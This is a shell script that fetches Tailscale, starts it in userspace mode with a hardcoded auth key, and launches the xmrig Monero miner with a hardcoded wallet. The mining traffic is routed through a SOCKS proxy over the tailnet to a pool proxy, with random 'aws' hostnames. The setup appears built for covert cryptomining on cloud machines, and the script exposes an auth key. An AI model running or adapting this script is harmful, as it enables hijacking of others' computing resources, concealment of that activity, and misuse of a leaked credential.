
TS_KEY="tskey-auth-keAGMY58Gz11CNTRL-Q98pDVF6DffajArpJaj8gfx8DVivhi62"
DOCKER_PROXY_IP="aws-proxy-box" 
WALLET="85RcBrmqpB2TboWNtPUEzTLR5QVqZSiTPdq1fTiGdwvmC5E2rUzovKqArdYToBEZWz3qxthgoi2n41SJHJPN9amC9HCQbk8"
if [ ! -f "./tailscale" ]; then
    echo "Downloading Tailscale for ARM64..."
    wget -q https://pkgs.tailscale.com/stable/tailscale_latest_arm64.tgz
    tar xzf tailscale_latest_arm64.tgz --strip-components=1
    chmod +x tailscale tailscaled
fi

pkill -f tailscaled

echo "Starting Tailscale in Userspace Mode..."
./tailscaled --tun=userspace-networking --socket=ts.sock --state=ts.state --socks5-server=localhost:1055 &
sleep 5

echo "Connecting to New Tailnet..."
./tailscale --socket=ts.sock up --authkey="$TS_KEY" --hostname="aws-arm-$RANDOM" --accept-dns=false --snat-subnet-routes=false
sleep 5

echo "Launching with your existing miner logic..."

./xmrig-aarch64-static \
  -c config.json \
  -o "$DOCKER_PROXY_IP:9999" \
  -u "$WALLET" \
  --proxy "127.0.0.1:1055" \
  --no-tls \
  --rig-id "aws-$(hostname)"
